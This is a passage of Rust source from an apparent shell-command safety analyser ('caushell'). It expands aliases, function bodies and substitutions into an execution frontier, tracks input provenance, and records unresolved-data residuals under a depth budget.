        dispatch_derived_records
            .iter()
            .map(|r| r.source_node_id.clone()),
    );
    frontier.extend(expanded_assignment_command_substitution_body_roots(
        &mut syntax_scopes,
        registry,
        session,
        request,
        parsed_request,
        max_nested_parse_depth,
    ));

    // Conservatively retain every alias definition in the enclosing request.
    // Conditional aliases cannot acquire an executable's stdout guarantee.
    let mut substitution_aliases = alias_bindings(session.summary(), request);
    for command in &parsed_request.commands {
        for assignment in crate::support::alias_assignments(command) {
            substitution_aliases.insert(
                assignment.name.clone(),
                SessionAliasBinding::new(assignment.name, assignment.body, request.sequence_no),
            );
        }
    }

    let mut visited = std::collections::BTreeSet::new();
    while let Some(mut entry) = frontier.pop() {
        expand_execution_alias_scope(registry, &mut entry);
        let program_context = program_contexts
            .remove(&entry.source_node_id)
            .unwrap_or_default();
        materialize_pathname_fields(
            registry,
            request,
            &mut entry,
            &program_context,
            pathname_context,
        );
        if let Some(command) = entry
            .parsed_scope
            .commands
            .get(entry.command_ref.command_index)
            && let Some(name) = command.command_name.as_deref()
            && let Some(profile) = registry.lookup(name).profile
        {
            for (observation, from_prefix_assignment) in
                caushell_profile::option_environment_observations(profile, command, &entry.bindings)
            {
                pathname_context.add_evidence(Evidence {
                    rule_id: caushell_types::RuleId::SelectionError,
                    summary: "tool option environment input".into(),
                    kind: caushell_types::EvidenceKind::ToolOptionEnvironment(
                        caushell_types::ToolOptionEnvironmentEvidence {
                            node_id: entry.source_node_id.0.clone(),
                            name: observation.name,
                            value: observation.value,
                            from_prefix_assignment,
                        },
                    ),
                });
            }
        }
        refresh_substitution_shape_proofs(
            registry,
            request,
            &mut entry,
            &substitution_aliases,
            max_nested_parse_depth,
        );
        let substitution_fields = refresh_substitution_argument_fields(
            registry, session, request, &mut entry, &program_context,
            max_nested_parse_depth, pathname_context,
        );
        let visit_key = (
            entry.source_node_id.clone(),
            entry.origin_index,
            entry.parent_execution_node_id.clone(),
            entry.origin_kind,
            entry.origin_locator.clone(),
            format!("{:?}", entry.shell_kind),
            entry.rendered_command_text.clone(),
            format!("{:?}", entry.bindings),
            format!("{:?}", entry.inherited_scope),
        );
        if !visited.insert(visit_key) {
            continue;
        }

        if entry.depth > max_nested_parse_depth {
            expansion_limit_evidence.push(Evidence::execution_expansion_truncated(
                entry.parent_execution_node_id.0.clone(),
                entry.rendered_command_text.clone(),
                entry.root_command_index,
                entry.depth,
                max_nested_parse_depth,
                1,
            ));
            continue;
        }

        if entry.origin_kind != ExecutionUnitOriginKind::TopLevel
            || entry.parsed_scope.raw_command != parsed_request.raw_command
        {
            register_shell_redirection_scope(
                registry,
                request,
                &mut syntax_scopes,
                &entry.parsed_scope,
                &entry.static_payload_scope.scope_base_bindings,
                entry.parent_execution_node_id.clone(),
                Some(entry.source_node_id.clone()),
                entry.origin_kind,
                entry.origin_locator.clone(),
                entry.depth,
                entry.root_command_index,
                false,
                max_nested_parse_depth,
            );
        }

        let direct_input = observed.inputs.get(&entry.source_node_id).filter(|input| {
            input.direct_stdin.is_some()
                && !entry.static_payload_scope.stdin_is_parent_output
                && !entry.inherited_scope.static_input_cwd_unproven
                && entry.inherited_scope.native_template_input.is_none()
                && input.scope == entry.static_payload_scope.parsed_scope
                && input.bindings == entry.bindings
        });
        let observed_stdin = direct_input.and_then(|input| input.direct_stdin.as_deref());
        refresh_execution_payload_projections(
            registry,
            session,
            request,
            &mut entry,
            max_nested_parse_depth,
            observed_stdin,
        );
        refresh_path_list_targets(
            registry,
            session,
            request,
            &mut entry,
            max_nested_parse_depth,
            observed_stdin,
        );
        if let Some(input) = direct_input {
            observed.decoded.insert(
                entry.source_node_id.clone(),
                caushell_types::NativeInputDecodeEvidence {
                    node_id: entry.source_node_id.0.clone(),
                    producer_node_id: input.records.node_id.clone(),
                    complete: true,
                    // A direct stdin consumer has no derived argv jobs.
                    alternative_groups: 0,
                    gap: None,
                    rejected_candidate_encoding: None,
                    empty_nul_path_snapshot: false,
                },
            );
        }

        // Native list input is not proof of the launched program's FD 0.
        // Until that routing is declared, keep an inherited stdin consumer
        // unresolved. Explicit job redirections and intra-job pipes retain
        // their ordinary stream analysis. This is semantic uncertainty, not
        // a command-name risk exception.
        let inherits_stdin = execution_unit_inherits_stdin(&entry);
        if !inherits_stdin {
            entry.inherited_scope.native_stdin_route_unproven = false;
            // A local redirection or pipeline replaced the inherited FD 0.
            entry.inherited_scope.native_stdin_route = None;
        }
        if (entry.inherited_scope.native_stdin_route_unproven
            || entry.inherited_scope.native_template_input.is_some()
            || entry
                .inherited_scope
                .native_argument_inputs
                .iter()
                .any(|input| input.consumer_node_id == entry.source_node_id))
            && inherits_stdin
            && entry.inherited_scope.native_stdin_route.is_none()
            && let ResolveInvocationArtifactResult::Resolved(resolved) = &mut entry.result
            && resolved.bound.native_argv_effect_envelope.is_none()
            && (resolved.bound.stream_contract.is_some_and(|contract| {
                matches!(
                    contract.stdin_mode,
                    caushell_profile::StreamInputMode::DataOptional
                        | caushell_profile::StreamInputMode::DataRequired
                        | caushell_profile::StreamInputMode::PayloadOptional
                        | caushell_profile::StreamInputMode::PayloadRequired
                )
            }) || resolved.bound.effects.iter().any(|effect| {
                effect.kind == EffectKind::ConsumeStdin
                    && match &effect.target {
                        EffectTarget::Slot(slot) => {
                            resolved.bound.bound_parameters.iter().any(|p| {
                                p.name == *slot
                                    && !p.semantic_values_are_inapplicable()
                                    && p.semantic_values().next().is_some()
                            })
                        }
                        EffectTarget::ImplicitInput(_) => true,
                        _ => false,
                    }
            }))
        {
            resolved.bound.operation_semantics_unresolved = true;
            resolved
                .bound
                .residuals
                .push(caushell_profile::Residual::new(
                    caushell_profile::ResidualKind::UnboundData,
                    caushell_profile::ResidualSurface::Data,
                    "native input routing is unproven",
                ));
        }

        // Byte recovery is not proof that input provenance survives a shell
        // variable assignment. Keep known job effects, but do not silently
        // turn replacement-derived assignments into untainted exact scalars.
        // Constant assignments, and unrelated commands, do not enter here.
        if let Some(origin) = &entry.inherited_scope.native_template_input
            && entry.parsed_scope.raw_command == origin.source_text
            && entry
                .parsed_scope
                .assignment_commands
                .iter()
                .flat_map(|command| command.assignments.iter())
                .chain(
                    entry
                        .parsed_scope
                        .declaration_commands
                        .iter()
                        .flat_map(|command| command.assignments.iter()),
                )
                .chain(
                    entry
                        .parsed_scope
                        .commands
                        .iter()
                        .flat_map(|command| command.prefix_assignments.iter()),
                )
                .any(|assignment| {
                    origin.origin.data_ranges.iter().any(|range| {
                        assignment.value.span.start_byte < range.end
                            && range.start < assignment.value.span.end_byte
                    })
                })
            && let ResolveInvocationArtifactResult::Resolved(resolved) = &mut entry.result
        {
            resolved.bound.operation_semantics_unresolved = true;
            resolved
                .bound
                .residuals
                .push(caushell_profile::Residual::new(
                    caushell_profile::ResidualKind::UnboundData,
                    caushell_profile::ResidualSurface::Data,
                    "native replacement assignment provenance is unproven",
                ));
        }

        if let Some(origin) = &entry.inherited_scope.native_template_input
            // Synthetic launcher quoting has a different byte coordinate
            // system. Only the rendered scope or span-preserving dispatch
            // descendants can be matched to replacement ranges.
            && (entry.parsed_scope.raw_command == origin.source_text
                || (entry.origin_kind == ExecutionUnitOriginKind::Dispatch
                    && entry.parent_execution_node_id != origin.origin.producer_node_id))
            && let ResolveInvocationArtifactResult::Resolved(resolved) = &entry.result
            && native_template_frame_input_unresolved(resolved, &entry.bindings, &origin.origin, &[])
            && let ResolveInvocationArtifactResult::Resolved(resolved) = &mut entry.result
        {
            resolved.bound.operation_semantics_unresolved = true;
            resolved
                .bound
                .residuals
                .push(caushell_profile::Residual::new(
                    caushell_profile::ResidualKind::UnboundData,
                    caushell_profile::ResidualSurface::Data,
                    "native template input provenance is unproven",
                ));
        }

        if let ResolveInvocationArtifactResult::Resolved(resolved) = &mut entry.result
            && entry
                .inherited_scope
                .native_argument_inputs
                .iter()
                .any(|input| {
                    input.consumer_node_id == entry.source_node_id
                        && native_template_frame_input_unresolved(
                            resolved,
                            &entry.bindings,
                            &input.origin,
                            &input.projections,
                        )
                })
        {
            // A new interpreter frame needs its own argument/variable lineage;
            // source offsets from the native argv are not payload offsets.
            resolved.bound.operation_semantics_unresolved = true;
            resolved
                .bound
                .residuals
                .push(caushell_profile::Residual::new(
                    caushell_profile::ResidualKind::UnboundData,
                    caushell_profile::ResidualSurface::Data,
                    "native interpreter argument provenance is unproven",
                ));
        }

        // Known shell functions are execution payloads, not external commands
        // lacking a Profile (or an executable sharing the function's name).
        // Top-level calls already enter as FunctionExpansion seeds. Derived
        // calls use the same frontier and its ordinary depth admission gate.
        let function_children = expanded_function_body_children(
            registry,
            request,
            &entry,
            max_nested_parse_depth,
            &mut syntax_scopes,
        );
        if let Some((name, _, incomplete)) = &function_children {
            let template_scope_unresolved = entry
                .inherited_scope
                .native_template_input
                .as_ref()
                .is_some_and(|origin| {
                    entry.parsed_scope.raw_command == origin.source_text
                        && (entry
                            .parsed_scope
                            .function_definitions
                            .iter()
                            .any(|definition| {
                                definition.name == *name
                                    && origin.origin.data_ranges.iter().any(|range| {
                                        definition.span.start_byte < range.end
                                            && range.start < definition.span.end_byte
                                    })
                            })
                            || entry
                                .parsed_scope
                                .commands
                                .get(entry.command_ref.command_index)
                                .is_some_and(|command| {
                                    command.tokens.iter().any(|token| {
                                        origin.origin.data_ranges.iter().any(|range| {
                                            token.span.start_byte < range.end
                                                && range.start < token.span.end_byte
                                        })
                                    })
                                }))
                });
            let argument_scope_unresolved = entry
                .inherited_scope
                .native_argument_inputs
                .iter()
                .filter(|input| input.consumer_node_id == entry.source_node_id)
                .any(|input| {
                    entry
                        .parsed_scope
                        .function_definitions
                        .iter()
                        .any(|definition| {
                            definition.name == *name
                                && input.origin.data_ranges.iter().any(|range| {
                                    definition.span.start_byte < range.end
                                        && range.start < definition.span.end_byte
                                })
                        })
                        || entry
                            .parsed_scope
                            .commands
                            .get(entry.command_ref.command_index)
                            .is_some_and(|command| {
                                command.tokens.iter().any(|token| {
                                    input.origin.data_ranges.iter().any(|range| {
                                        token.span.start_byte < range.end
                                            && range.start < token.span.end_byte
                                    })
                                })
                            })
                });
            let native_scope_unresolved = template_scope_unresolved || argument_scope_unresolved;
            let reason = incomplete.as_deref().or_else(|| {
                native_scope_unresolved.then_some(
                "native replacement input crosses a function scope without proven data provenance"
            )
            });
            entry.result = if let Some(reason) = reason {
                ResolveInvocationArtifactResult::SelectionError {
                    normalized_command_name: name.clone(),
                    gap_kind: caushell_types::ResolveGapKind::OpaqueInvocation,
                    error: caushell_profile::BindError::UncertainFunctionBinding {
                        command_name: name.clone(),
                        reason: reason.to_owned(),
                    },
                    partial_bound: None,
                }
            } else {
                ResolveInvocationArtifactResult::NoProfile {
                    normalized_command_name: name.clone(),
                    gap_kind: caushell_types::ResolveGapKind::NoProfile,
                    executable_word: None,
                }
            };
            if reason.is_none() {
                // This exact call has a known function body in the canonical
                // frontier, including bodies containing only assignments or
                // redirections. Child/depth/parse guards remain independent.
                expanded_function_calls.insert(entry.source_node_id.clone(), name.clone());
            }
        }

        if function_children.is_none()
            && matches!(&entry.result, ResolveInvocationArtifactResult::NoProfile {
                normalized_command_name, ..
            } if normalized_command_name == "let")
            && let Some(command) = source_let_with_arithmetic(&entry, parsed_request)
        {
            // The arithmetic audit and native argument expansion are already
            // owned by the source shell. Bind the intrinsic only at this
            // boundary so a generic lookup cannot certify unproved argv.
            let context = runtime_context_for_parsed_command(
                &entry.parsed_scope,
                entry.command_ref.command_index,
                command,
            );
            entry.result = caushell_profile::resolve_source_let_artifact(
                registry, command, context, &entry.bindings,
            );
        }

        configuration::resolve_stock_initialization(registry, pathname_context, &mut entry);

        let frontier_depth = entry.depth;
        let child_bindings = entry.bindings.clone();
        let child_inherited_scope = entry.inherited_scope.clone();
        let child_shell_kind = entry.shell_kind;
        let child_root_command_index = entry.root_command_index;
        let child_parent_execution_node_id = entry.parent_execution_node_id.clone();
        let child_parsed_scope = entry.parsed_scope.clone();
        let child_command_ref = entry.command_ref.clone();
        let child_result = entry.result.clone();
        let child_rendered_command_text = entry.rendered_command_text.clone();
        let child_origin_kind = entry.origin_kind;
        let child_origin_index = entry.origin_index;
        let child_origin_locator = entry.origin_locator.clone();
        let child_source_node_id = entry.source_node_id.clone();

        records.push(ExecutionUnitResolveRecord {
            source_node_id: child_source_node_id,
            command_ref: child_command_ref,
            parsed_scope: child_parsed_scope.clone(),
            rendered_command_text: child_rendered_command_text,
            result: child_result.clone(),
            shell_kind: child_shell_kind,
            root_command_index: child_root_command_index,
            depth: frontier_depth,
            parent_execution_node_id: child_parent_execution_node_id.clone(),
            bindings: child_bindings.clone(),
            origin_kind: child_origin_kind,
            origin_index: child_origin_index,
            origin_locator: child_origin_locator,
            inherited_scope: child_inherited_scope.clone(),
        });

        if let Some((_, children, _)) = function_children {
            if frontier_depth < max_nested_parse_depth {
                inherit_program_source_contexts(
                    registry,
                    request,
                    &entry,
                    &program_context,
                    &children,
                    &mut program_contexts,
                );
                frontier.extend(children);
            } else if !children.is_empty() {
                expansion_limit_evidence.push(Evidence::execution_expansion_truncated(
                    entry.source_node_id.0.clone(),
                    entry.rendered_command_text.clone(),
                    entry.root_command_index,
                    entry.depth,
                    max_nested_parse_depth,
                    children.len(),
                ));
            }
            continue;
        }

        // Shell argument substitutions execute before the callee, regardless
        // of its Profile coverage or selection success. Already-expanded argv
        // data is excluded by the producer query, not reparsed as shell code.
        let mut children = expanded_command_substitution_body_children(
            &mut syntax_scopes,
            registry,
            request,
            &entry,
            max_nested_parse_depth,
        );
        configuration::resolve_native_configuration(
            registry,
            session,
            request,
            &mut entry,
            &program_context,
            pathname_context,
        );
        if let Some(record) = records
            .iter_mut()
            .rev()
            .find(|record| record.source_node_id == entry.source_node_id)
        {
            record.result = entry.result.clone();
        }

        let resolved = match &entry.result {
            ResolveInvocationArtifactResult::Resolved(resolved) => Some(resolved),
            _ => None,
        };
        children.extend(expanded_process_substitution_body_children(
            &mut syntax_scopes,
            registry,
            request,
            &entry,
            resolved,
            max_nested_parse_depth,
        ));
        if let Some(resolved) = resolved {
            children.extend(expanded_config_program_children(
                registry,
                pathname_context,
                session,
                request,
                &entry,
                resolved,
                &program_context,
                max_nested_parse_depth,
                first_payload_id,
                &mut derived_payloads,
                &mut syntax_scopes,
                &mut program_contexts,
            ));
            // This producer belongs to the canonical execution frontier so
            // native dispatches and ordinary calls share the same boundary.
            // A nested scope without a proven entry cwd keeps relative code
            // locations unknown; absolute declarations remain exact.
            if resolved.bound.effects.iter().any(|effect| {
                effect.kind == EffectKind::ExecutePayload
                    && matches!(
                        effect.target,
                        EffectTarget::ConfiguredPath(_) | EffectTarget::ToolConventionPath(_)
                    )
            }) {
                let source_entry_cwd = if entry.static_payload_scope.parsed_scope == *parsed_request
                {
                    caushell_runner::EffectiveCwd::known(request.shell_state_before.cwd())
                } else {
                    caushell_runner::EffectiveCwd::Unknown
                };
                for payload in configured_payload_frontier_entries(
                    registry,
                    request,
                    &entry.static_payload_scope.parsed_scope,
                    entry.static_payload_scope.command_index,
                    &resolved.bound,
                    crate::support::ExecutionResolveRecordRef::relative_to_supplied_base(
                        records.last().expect("current execution record"),
                    ),
                    &entry.bindings,
                    &entry.static_payload_scope.scope_base_bindings,
                    &source_entry_cwd,
                    NestedPayloadParentRef::DerivedInvocation {
                        node_id: entry.source_node_id.clone(),
                    },
                    entry.root_command_index,
                    entry.depth.saturating_add(1),
                ) {
                    let materialized = materialize_frontier_entry(&payload);
                    let record_id =
                        NestedPayloadRecordId(first_payload_id + derived_payloads.len());
                    let mut record = NestedPayloadRecord::from_parse_result(
                        record_id,
                        payload.parent_ref,
                        payload.root_command_index,
                        payload.depth,
                        payload.bindings,
                        materialized.clone(),
                        parse_recursive_payload_candidate(&materialized.candidate),
                    );
                    if payload.depth > max_nested_parse_depth {
                        record.resolution = NestedPayloadResolution::TruncatedByDepthBudget {
                            max_depth: max_nested_parse_depth,
                            next_candidate_count: 1,
                        };
                    }
                    record.execution_cwd = Some(payload.scope_entry_cwd);
                    derived_payloads.push(record);
                }
            }
            children.extend(expanded_dispatch_children(
                registry, request, &entry, resolved,
            ));
            children.extend(expanded_shell_payload_children(
                registry,
                request,
                &entry,
                resolved,
                max_nested_parse_depth,
                &mut syntax_scopes,
            ));
            children.extend(expanded_recursive_payload_children(
                registry,
                session,
                request,
                &entry,
                resolved,
                &program_context,
                legacy_payload_sources.contains(&entry.source_node_id) && !substitution_fields.iter().any(|proof| proof.exact_fields().is_some()),
                max_nested_parse_depth,
                first_payload_id,
                &mut derived_payloads,
                &mut syntax_scopes,
            ));

            children.extend(expanded_static_xargs_children(
                registry,
                session,
                request,
                &entry,
                resolved,
                max_nested_parse_depth,
                &mut symbolic_xargs_arity_budget,
                observed,
            ));
            children.extend(expanded_native_parallel_children(
                registry,
                session,
                request,
                &entry,
                resolved,
                max_nested_parse_depth,
            ));
        }

        if frontier_depth < max_nested_parse_depth {
            inherit_program_source_contexts(
                registry,
                request,
                &entry,
                &program_context,
                &children,
                &mut program_contexts,
            );
            frontier.extend(children);
        } else {
            // All existing child producers share this admission gate. Do not
            // recurse beyond the budget or silently drop the pending frontier.
            // No extra graph traversal or command-specific risk logic is needed.
            let unresolved_dispatch_count =
                if resolved.is_none_or(should_skip_generic_dispatch_projection) {
                    0
                } else {
                    dispatch_projection_for_resolved(
                        registry, resolved.unwrap(), request.shell_state_before.cwd(),
                        request.home.as_deref(),
                    )
                        .unresolved
                        .len()
                };
            let next_candidate_count = children.len() + unresolved_dispatch_count;
            if next_candidate_count > 0 {
                expansion_limit_evidence.push(Evidence::execution_expansion_truncated(
                    entry.source_node_id.0.clone(),
                    entry.rendered_command_text.clone(),
                    entry.root_command_index,
                    entry.depth,
                    max_nested_parse_depth,
                    next_candidate_count,
                ));
            }
        }
    }

    (
        records,
        expansion_limit_evidence,
        derived_payloads,
        syntax_scopes,
        canonical_inline_payload_ids,
        expanded_function_calls,
    )
}

/// Register only syntax actually admitted by the normal expansion budget.
/// Plain-command scopes take the cheap no-orphan branch; no second parse.
fn register_shell_redirection_scope(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    scopes: &mut Vec<caushell_runner::ShellRedirectionScope>,
    parsed: &caushell_parse::ParsedCommandArtifact,
    base_bindings: &SessionBindings,
    parent: caushell_graph::NodeId,
    representative: Option<caushell_graph::NodeId>,
    origin_kind: ExecutionUnitOriginKind,
    origin_locator: ExecutionUnitOriginLocator,
    depth: u8,
    root_command_index: usize,
    is_request_scope: bool,
    max_depth: u8,
) {
    if depth > max_depth
        || !parsed
            .redirections
            .iter()
            .any(|r| r.opening_statement.is_some())
    {
        return;
    }
    if let Some(scope) = scopes.iter_mut().find(|s| {
        s.parent_execution_node_id == parent
            && s.origin_kind == origin_kind
            && s.origin_locator == origin_locator
            && s.parsed.raw_command == parsed.raw_command
            && s.root_command_index == root_command_index
    }) {
        if scope.representative_record_node_id.is_none() {
            scope.representative_record_node_id = representative;
        }
        return;
    }
    let scope_index = scopes.len();
    let mut units: Vec<caushell_runner::ShellRedirectionUnit> = Vec::new();
    for (index, redirect) in parsed.redirections.iter().enumerate() {
        if redirection_parent_command_index(parsed, redirect).is_some() {
            continue;
        }
        let Some(statement) = &redirect.opening_statement else {
            continue;
        };
        if let Some(unit) = units
            .iter_mut()
            .find(|u| u.opening_statement.span == statement.span)
        {
            unit.redirection_indexes.push(index);
            continue;
        }
        let bindings = apply_runtime_variable_bindings_before_span(
            registry,
            request,
            base_bindings.clone(),
            parsed,
            statement.span.start_byte,
            request.sequence_no,
        );
        let source_node_id = caushell_graph::NodeId::new(format!(
            "shell-redirection:{}:{}:{}:{}:{}",
            request.session_id.0.len(),
            request.session_id.0,
            request.sequence_no.0,
            scope_index,
            units.len()
        ));
        units.push(caushell_runner::ShellRedirectionUnit {
            source_node_id,
            opening_statement: statement.clone(),
            redirection_indexes: vec![index],
            bindings,
        });
    }
    if !units.is_empty() {
        scopes.push(caushell_runner::ShellRedirectionScope {
            parent_execution_node_id: parent,
            representative_record_node_id: representative,
            origin_kind,
            origin_locator,
            parsed: parsed.clone(),
            depth,
            root_command_index,
            is_request_scope,
            units,
        });
    }
}

fn execution_unit_inherits_stdin(entry: &ExpandedFrontierEntry) -> bool {
    crate::support::effective_stdin_source(&entry.parsed_scope, entry.command_ref.command_index)
        == crate::support::EffectiveStdinSource::Inherited
        && entry
            .parsed_scope
            .commands
            .get(entry.command_ref.command_index)
            .is_none_or(|command| {
                command.pipeline_position.is_none_or(|position| {
                    matches!(
                        position,
                        caushell_parse::PipelinePosition::First
                            | caushell_parse::PipelinePosition::Only
                    )
                })
            })
}

/// Exact argv-to-source mappings preserve direct words across a shell frame.
/// Variable and positional transfers still require their own lineage proof.
fn native_template_frame_input_unresolved(
    resolved: &caushell_profile::ResolvedInvocationArtifact,
    bindings: &SessionBindings,
    origin: &caushell_runner::NativeInputOrigin,
    projections: &[caushell_runner::NativeArgumentProjection],
) -> bool {
    let overlaps = |span: &caushell_parse::SourceSpan| {
        origin
            .data_ranges
            .iter()
            .any(|range| span.start_byte < range.end && range.start < span.end_byte)
    };
    let parameter_uses_input = |parameter: &BoundParameter| {
        parameter.values.iter().any(|value| match value {
            BoundValue::Argument { span, .. } => overlaps(span),
            BoundValue::ImplicitInput {
                origin: Some(input),
                ..
            } => overlaps(&input.span),
            _ => false,
        })
    };
    let shell_payload = shell_payload_from_bound_invocation(resolved, bindings);
    let projected_payload_span = shell_payload.as_ref().and_then(|(payload, span, _)| {
        let shell_kind = match resolved.normalized_command_name.as_str() {
            "bash" => caushell_types::ShellKind::Bash,
            "sh" => caushell_types::ShellKind::Sh,
            _ => return None,
        };
        crate::support::native_shell_payload_projection(projections, span, payload, shell_kind)
            .map(|_| span)
    });
    resolved
        .bound
        .effects
        .iter()
        .any(|effect| match &effect.target {
            EffectTarget::Dispatch(target) => target.environment.iter().any(|slot| {
                resolved
                    .bound
                    .bound_parameters
                    .iter()
                    .any(|parameter| parameter.name == *slot && parameter_uses_input(parameter))
            }),
            EffectTarget::Slot(slot) if effect.kind == EffectKind::ExecutePayload => {
                resolved.bound.bound_parameters.iter().any(|parameter| {
                    parameter.name == *slot
                        && parameter_uses_input(parameter)
                        && !parameter.values.iter().all(|value| match value {
                            BoundValue::Argument { span, .. } => {
                                projected_payload_span == Some(span)
                            }
                            _ => false,
                        })
                })
            }
            _ => false,
        })
        || shell_payload
            .is_some_and(|(_, _, arguments)| arguments.iter().any(|arg| overlaps(&arg.span)))
}

fn expanded_function_body_children(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    entry: &ExpandedFrontierEntry,
    max_nested_parse_depth: u8,
    syntax_scopes: &mut Vec<caushell_runner::ShellRedirectionScope>,
) -> Option<(String, Vec<ExpandedFrontierEntry>, Option<String>)> {
    if matches!(
        &entry.result,
        ResolveInvocationArtifactResult::SelectionError {
            error: caushell_profile::BindError::UnresolvedAliasExpansion { .. },
            ..
        }
    ) {
        return None;
    }
    if entry.origin_kind == ExecutionUnitOriginKind::TopLevel
        && entry.parsed_scope.raw_command == request.command
    {
        return None;
    }
    let command = entry
        .parsed_scope
        .commands
        .get(entry.command_ref.command_index)?;
    let prepared = caushell_profile::materialize_structured_command(command, &entry.bindings);
    let command = prepared.as_ref().unwrap_or(command);
    let name = if command.command_name_runtime_data {
        command.command_name.clone()?
    } else {
        caushell_profile::materialize_command_name(
            command.command_name.as_deref()?,
            &entry.bindings,
        )?
    };
    let binding = entry.bindings.function_binding(&name)?;
    if binding.uncertainty.is_some() {
        return None; // The ordinary resolver already emits OpaqueInvocation.
    }
    let Ok(body) = caushell_parse::parse_command(&binding.body, entry.shell_kind) else {
        return Some((
            name,
            Vec::new(),
            Some("function body could not be parsed".into()),
        ));
    };
    let projection = caushell_profile::materialize_projected_invocation(
        &caushell_profile::project_invocation(
            command,
            InvocationRuntimeContext::default().with_shell_kind(entry.shell_kind),
        ),
        &entry.bindings,
    );
    let environment = crate::support::command_environment_bindings(
        &entry.bindings,
        &entry.parsed_scope,
        &entry.command_ref,
    );
    // Functions keep the caller's variables and shell namespace, unlike an
    // executable shell. Only their positional parameters are replaced.
    let bindings = crate::support::function_call_bindings(&environment, &projection);
    if body.commands.is_empty() {
        register_shell_redirection_scope(
            registry,
            request,
            syntax_scopes,
            &body,
            &bindings,
            entry.source_node_id.clone(),
            None,
            ExecutionUnitOriginKind::FunctionExpansion,
            ExecutionUnitOriginLocator::FunctionExpansion {
                function_name: name.clone(),
            },
            entry.depth.saturating_add(1),
            entry.root_command_index,
            false,
            max_nested_parse_depth,
        );
    }
    // Unknown bytes are data, not unanalysed code. Unknown argv width is a
    // separate fact: never pin a later literal to the wrong $n or treat an
    // unresolved $@ as a proven empty list, including after shift.
    let mut children: Vec<_> = body
        .commands
        .iter()
        .enumerate()
        .map(|(index, child)| {
            let child_bindings = apply_runtime_variable_bindings_before_span(
                registry,
                request,
                bindings.clone(),
                &body,
                child.span.start_byte,
                request.sequence_no,
            );
            ExpandedFrontierEntry {
                source_node_id: expanded_virtual_node_id(
                    "function-body",
                    &entry.source_node_id,
                    index,
                ),
                command_ref: ParsedCommandRef::new(index, child.span.clone()),
                parsed_scope: body.clone(),
                rendered_command_text: child.text.clone(),
                result: resolve_invocation_artifact_with_bindings(
                    registry,
                    child,
                    runtime_context_for_parsed_command(&body, index, child),
                    &child_bindings,
                ),
                shell_kind: entry.shell_kind,
                root_command_index: entry.root_command_index,
                depth: entry.depth.saturating_add(1),
                parent_execution_node_id: entry.source_node_id.clone(),
                bindings: child_bindings.clone(),
                static_payload_scope: StaticPayloadLookupScope {
                    parsed_scope: body.clone(),
                    command_index: index,
                    bindings: child_bindings,
                    scope_base_bindings: bindings.clone(),
                    stdin_is_parent_output: false,
                },
                history_anchor_node_id: entry.history_anchor_node_id.clone(),
                origin_kind: ExecutionUnitOriginKind::FunctionExpansion,
                origin_index: index,
                origin_locator: ExecutionUnitOriginLocator::FunctionExpansion {
                    function_name: name.clone(),
                },
                inherited_scope: entry.inherited_scope.clone(),
            }
        })
        .collect();
    children.extend(
        expanded_assignment_command_substitution_body_children_for_scope(
            syntax_scopes,
            registry,
            request,
            &body,
            entry.shell_kind,
            &entry.source_node_id,
            &entry.history_anchor_node_id,
            entry.root_command_index,
            entry.depth.saturating_add(2),
            &bindings,
            &entry.inherited_scope,
            None,
            Some("function-body"),
            children
                .first()
                .map(|child| AssignmentCwdSource::RecordScope(&child.source_node_id))
                .unwrap_or(AssignmentCwdSource::InvocationEntry),
            max_nested_parse_depth,
        ),
    );
    // Shell substitutions in the call run before the function, independently
    // of whether its body ever consumes their resulting argument bytes.
    children.extend(expanded_command_substitution_body_children(
        syntax_scopes,
        registry,
        request,
        entry,
        max_nested_parse_depth,
    ));
    children.extend(expanded_process_substitution_body_children(
        syntax_scopes,
        registry,
        request,
        entry,
        None,
        max_nested_parse_depth,
    ));
    Some((name, children, None))
}

fn unresolved_alias_result(name: &str, reason: &str) -> ResolveInvocationArtifactResult {
    ResolveInvocationArtifactResult::SelectionError {
        normalized_command_name: name.to_owned(),
        gap_kind: caushell_types::ResolveGapKind::OpaqueInvocation,
        error: caushell_profile::BindError::UnresolvedAliasExpansion {
            command_name: name.to_owned(),
            reason: reason.to_owned(),
        },
        partial_bound: None,
    }
}

fn expand_execution_alias_scope(registry: &ProfileRegistry, entry: &mut ExpandedFrontierEntry) {
    if matches!(
        entry.origin_kind,
        ExecutionUnitOriginKind::Dispatch | ExecutionUnitOriginKind::StaticXargs
    ) {
        return;
    }
    let Some(command) = entry
        .parsed_scope
        .commands
        .get(entry.command_ref.command_index)
    else {
        return;
    };
    let aliases = entry
        .bindings
        .alias_bindings()
        .map(|binding| (binding.name.clone(), binding.clone()))
        .collect();
    let expansion = crate::support::expand_alias_scope(
        command,
        entry.shell_kind,
        &aliases,
        MAX_ALIAS_EXPANSION_HOPS,
    );
    let name = command.command_name.as_deref().unwrap_or_default();
    if let Some(reason) = expansion.incomplete {
        entry.result = unresolved_alias_result(name, reason);
        return;
    }
    let Some(expanded) = expansion.parsed else {
        return;
    };
    let mut text = entry.parsed_scope.raw_command.clone();
    let range = command.span.start_byte..command.span.end_byte;
    if text.get(range.clone()).is_none() {
        entry.result = unresolved_alias_result(name, "alias invocation has no source scope");
        return;
    }
    text.replace_range(range, &expanded.raw_command);
    let Ok(parsed) = caushell_parse::parse_command(&text, entry.shell_kind) else {
        entry.result =
            unresolved_alias_result(name, "expanded alias source scope could not be parsed");
        return;
    };
    if parsed.status != caushell_parse::ParseStatus::Complete
        || parsed.commands.len() != entry.parsed_scope.commands.len()
    {
        entry.result = unresolved_alias_result(
            name,
            "expanded alias changed the enclosing command structure",
        );
        return;
    }
    let command = &parsed.commands[entry.command_ref.command_index];
    entry.result = resolve_invocation_artifact_with_bindings(
        registry,
        command,
        runtime_context_for_parsed_command(&parsed, entry.command_ref.command_index, command),
        &entry.bindings,
    );
    entry.command_ref.span = command.span.clone();
    entry.rendered_command_text = command.text.clone();
    entry.parsed_scope = parsed.clone();
    entry.static_payload_scope.parsed_scope = parsed;
}

fn refresh_substitution_shape_proofs(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    entry: &mut ExpandedFrontierEntry,
    inherited_aliases: &BTreeMap<String, SessionAliasBinding>,
    max_depth: u8,
) {
    if matches!(
        &entry.result,
        ResolveInvocationArtifactResult::SelectionError {
            error: caushell_profile::BindError::UnresolvedAliasExpansion { .. },
            ..
        }
    ) {
        return;
    }
    // Top-level records already use their ordered alias overlay. All other
    // execution origins share this query, including shell/dispatch payloads.
    // A dispatcher receives already-expanded argv. Its output-shape proofs
    // come only from unchanged parent fields, in expanded_dispatch_children;
    // never reevaluate substitutions in the child's environment/namespace.
    if entry.depth == 0
